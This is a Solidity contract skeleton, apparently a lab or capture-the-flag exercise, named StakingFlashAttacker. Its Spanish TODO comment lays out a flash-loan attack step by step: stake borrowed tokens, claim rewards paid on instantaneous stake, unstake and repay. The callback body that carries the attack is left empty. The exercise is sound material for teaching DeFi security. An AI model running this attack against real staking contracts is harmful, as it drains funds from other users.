// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRewardStaking {
    function stake(uint256 amount) external;
    function claimReward() external;
    function unstake(uint256 amount) external;
}

interface IFlashLender {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

interface IFlashBorrower {
    function onFlashLoan(uint256 amount, bytes calldata data) external;
}

contract StakingFlashAttacker is IFlashBorrower {
    IRewardStaking public immutable staking;
    IFlashLender public immutable lender;
    IERC20 public immutable stakeToken;
    address public immutable owner;

    constructor(address _staking, address _lender, address _stakeToken) {
        staking = IRewardStaking(_staking);
        lender = IFlashLender(_lender);
        stakeToken = IERC20(_stakeToken);
        owner = msg.sender;
    }

    function attack(uint256 flashAmount) external {
        lender.flashLoan(flashAmount, "");
        payable(owner).transfer(address(this).balance);
    }

    // TODO: aquí vive el exploit, dentro del callback del flash loan (ya
    // tienes `amount` TOKEN prestado en este contrato). En este orden:
    //   1. Aprueba `amount` a `staking` y haz staking.stake(amount).
    //   2. Llama a staking.claimReward() -- se reparte según el stake
    //      INSTANTÁNEO, sin importar que acabes de entrar.
    //   3. staking.unstake(amount) para recuperar el capital prestado.
    //   4. Devuelve el préstamo: stakeToken.transfer(address(lender), amount).
    function onFlashLoan(uint256 amount, bytes calldata) external override {
        // completa aquí
    }

    receive() external payable {}
}
